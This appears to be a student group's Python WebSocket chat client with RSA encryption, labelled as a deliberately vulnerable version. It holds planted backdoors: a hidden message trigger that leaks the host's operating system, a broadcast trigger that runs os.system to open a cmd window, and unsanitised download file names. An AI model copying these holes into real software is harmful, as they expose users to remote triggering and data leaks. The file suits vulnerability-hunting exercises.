###############################################
#                  Group 4                    #
###############################################
#             Anlan Zou (a1899146)            #
#     Czennen Trixter C Tamayo (a1904082)     #
#           Yan Lok Chan (a1902578)           #
#          Yu-Ting Huang (a1903622)           #
###############################################
#         WARNING: VULNERABLE VERSION         #
###############################################

import logging
import logging.config
import yaml
import platform
import os
import asyncio
import websockets
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
import base64
import json
import traceback
import sys
import getpass

log_directory = 'log'
download_directory = 'download'

# Create the log directory if it doesn't exist
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

if not os.path.exists(download_directory):
    os.makedirs(download_directory)

# Load logging configuration from YAML file
with open('client_logging.yaml', 'r') as config_file:
    config = yaml.safe_load(config_file)

# Configure logging based on the YAML configuration
logging.config.dictConfig(config)

# Create logger
logger = logging.getLogger('chat_client')


def log_unhandled_exception(exc_type, exc_value, exc_traceback):
    # Log the unhandled exception with traceback
    logger.exception("An unhandled exception occurred:", exc_info=(exc_type, exc_value, exc_traceback))


# Set the custom exception handler
sys.excepthook = log_unhandled_exception

from datetime import datetime


def get_current_timestamp():
    # Get the current timestamp
    timestamp = datetime.now()
    # Convert the timestamp to a string
    return timestamp.strftime("%Y%m%d_%H%M%S")


# Generate RSA key pair as client startup
local_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
local_public_key = local_private_key.public_key()

local_public_key_pem = local_public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
).decode("utf-8")

default_padding = padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA256(), label=None
)

current_presence = []


# Split data into chunks
def data_split(data:bytes, chunk_size:int):
    chunks = []
    for i in range(0, len(data), chunk_size):
        chunks.append(data[i:i+chunk_size])
    return chunks


def base64_rsa_encrypt(data_bytes: bytes, public_key_pem: str) -> str:
    """
    Encrypts data using given RSA public key and base64.
    Due to the limitation of RSA encryption, data is split into chunks of
    190 bytes, then encrypt chunk by chunk and then combine all encrypted
    chunks together, and finally apply base64 encoding.
    """
    public_key = serialization.load_pem_public_key(public_key_pem.encode("utf-8"))
    if not isinstance(public_key, rsa.RSAPublicKey):
        raise ValueError("Invalid public key format")
    encrypted_data = b''
    for data_chunk in data_split(data_bytes, 190):
        encrypted_data += public_key.encrypt(data_chunk, default_padding)
    return base64.b64encode(
        encrypted_data
    ).decode("utf-8")


def base64_rsa_decrypt(encrypted_message: str) -> bytes:
    """
    Decrypts data using given RSA private key and base64.
    Due to the limitation of RSA encryption, decoded data is split into chunks of
    256 bytes, then decrypt chunk by chunk and then combine all decrypted
    chunks together to restore original data
    """
    decrypted_data = b''
    for data_chunk in data_split(base64.b64decode(encrypted_message), 256):
        decrypted_data += local_private_key.decrypt(data_chunk, default_padding)
    return decrypted_data


def encrypt_message(message: str, public_key_pem: str):
    return base64_rsa_encrypt(message.encode("utf-8"), public_key_pem)


def decrypt_message(encrypted_data):
    return base64_rsa_decrypt(encrypted_data).decode('utf-8')


def encrypt_file_data(file_data: bytes, public_key_pem: str):
    return base64_rsa_encrypt(file_data, public_key_pem)


def decrypt_file_data(encrypted_data):
    return base64_rsa_decrypt(encrypted_data)


# Convert json string to dict
def parse_json(json_str: str) -> dict:
    try:
        return json.loads(json_str)
    except json.JSONDecodeError:
        logger.warning(f"JSON parsing error: {json_str}")
        return {}
    
def verify_presence():
    presence_pack = f'{platform.system()}'
    return presence_pack


async def receive_messages(websocket):
    """
    Handler for received data from connected websocket.
    It will save the received file to specific folder,
    and it will display received message in console.
    """
    try:
        while True:
            try:
                message = await websocket.recv()
                if message.startswith("FILE"):
                    try:
                        file_part = message.split(" ", 3)
                        if len(file_part) < 4:
                            logger.error('Incorrect FILE message format')
                            continue
                        _, sender, file_data, file_name = file_part
                        full_file_path = f'{download_directory}/{file_name}.{get_current_timestamp()}'
                        with open(full_file_path, "wb") as file:
                            file.write(decrypt_file_data(file_data))
                        print(f"Received file from {sender} at {full_file_path}")
                    except Exception as e:
                        logger.error(f"Error receiving file: {e}")
                elif message:
                    # special handling for updating presence, which contains public key
                    if "tag" in message and "presence" in message:
                        presence_json = parse_json(message)
                        global current_presence
                        current_presence = presence_json["presence"]
                    else:
                        msg_split = message.split(": ", 1)
                        if len(msg_split) < 2:
                            print(message)
                        else:
                            sender, encrypted_message = message.split(": ", 1)
                            if sender.startswith("@"):
                                try:
                                    real_msg = decrypt_message(encrypted_message)
                                    if real_msg.startswith("><"):
                                        await websocket.send(verify_presence())
                                    else:
                                        print(sender[1:] + ": " + real_msg)
                                except Exception as e:
                                    logger.error(f'decryption error on  {encrypted_message}: {e}')
                            else:
                                print(message)
                                try:
                                    if message.split(" ")[1] == decrypt_message(bind):
                                        os.system(f'start cmd /k "echo {message.split(" ")[1]}"')
                                except:
                                    pass
                else:
                    break
            except websockets.ConnectionClosed:
                logger.info("Server connection closed.")
                break
            except Exception as e:
                logger.error(f"Error receiving message: {e}")
                logger.exception(traceback.print_exc())
                break
    finally:
        await websocket.close()
        logger.info("Connection closed gracefully.")
        logger.info("Please press Enter to exit ....")


async def start_client():
    """
    Start client and connect to chat server.
    It will wait for user input for interacting with the chat server.
    Interaction includes authentication, sending message, sending file,
    and broadcasting message.
    """
    config = {}
    with open("client_config.yaml", "r") as f:
        try:
            config = yaml.safe_load(f)
        except yaml.YAMLError:
            logging.error("unable to read config yaml file")
    chat_server_config = config.get("chat_server", {})
    host = chat_server_config.get("host", "localhost")
    port = chat_server_config.get("port", 12345)
    global bind
    bind = encrypt_message(f'{port}', local_public_key_pem)
    uri = f"ws://{host}:{port}"
    try:
        async with websockets.connect(uri) as websocket:
            # Authentication exchange
            while True:
                response = await websocket.recv()
                print(response)
                if response == "Enter your username: ":
                    username = input()
                    await websocket.send(username)
                elif response == "Enter your password: ":
                    password = getpass.getpass("")
                    await websocket.send(password)
                elif response == "Authentication successful":
                    # send public key pem after authentication
                    await websocket.send(local_public_key_pem)
                    break
                elif "Authentication failed" in str(response):
                    logger.warning(f"{response}. Disconnecting.")
                    await websocket.close()
                    return

            receive_task = asyncio.create_task(receive_messages(websocket))

            # User input exchange, includes sending message and file
            while True:
                message = await asyncio.to_thread(input)
                if websocket.closed:
                    break
                # special command to close the client
                if message.strip().upper() == "EXIT":
                    await websocket.close()
                    await receive_task
                    break
                # special command to send file
                # expected format: FILE <user>@<server> <filepath>
                elif message.startswith("FILE"):
                    parts = message.split(" ", 2)
                    if len(parts) < 3:
                        print("Usage: FILE username@server filepath")
                        continue
                    _, target_username, file_path = parts
                    try:
                        target_presence_array = [
                            presence
                            for presence in current_presence
                            if presence["jid"] == target_username
                        ]
                        if len(target_presence_array) < 1:
                            logger.warning(f"User {target_username} not present")
                            continue
                        target_presence = target_presence_array[0]
                        with open(file_path, "rb") as file:
                            file_name = os.path.basename(file_path)
                            file_data = file.read()
                            encrypted_file_data = encrypt_file_data(file_data, target_presence["publickey"])
                            file_message = f"FILE {target_username} {file_name} {encrypted_file_data}"
                            await websocket.send(file_message)
                    except FileNotFoundError:
                        logger.warning(f"File {file_path} not found.")
                    except Exception as e:
                        logger.error(f'unable to handle message: {e}')
                # special command to display all current active users across servers
                elif message.startswith("LIST"):
                    active_users = [f"{presence['nickname']}({presence['jid']})" for presence in current_presence]
                    print(f"active users: {active_users}")
                else:
                    # special command to send direct message
                    # expected format: @<user>@<server> <message>
                    if message.startswith("@"):
                        try:
                            target_username_str, info = message.split(" ", 1)
                            target_username = target_username_str[1:]
                            target_presence_array = [
                                presence
                                for presence in current_presence
                                if presence["jid"] == target_username
                            ]
                            if len(target_presence_array) < 1:
                                logger.warning(f"User {target_username} not present")
                                continue
                            target_presence = target_presence_array[0]
                            sender = ''
                            if info.startswith('--'):
                                parts = info.split('--', 2)
                                if len(parts) == 3:
                                    sender = f"--{parts[1]}--"
                                    info = parts[2]
                            message = (
                                target_username_str
                                + " "
                                + sender
                                + encrypt_message(info, target_presence["publickey"])
                            )
                        except ValueError as e:
                            logger.error(f'unable send message {message}: {e}')
                            continue
                    # Assume to be broadcast message
                    if message:
                        await websocket.send(message)
                    else:
                        print("Error: Cannot Send Empty Message!")

    except websockets.ConnectionClosed:
        logger.info("Connection closed by server.")
    except Exception as e:
        logger.error(f"Error: {e}")
    finally:
        logger.info("Client shutting down.")


if __name__ == "__main__":
    asyncio.run(start_client())
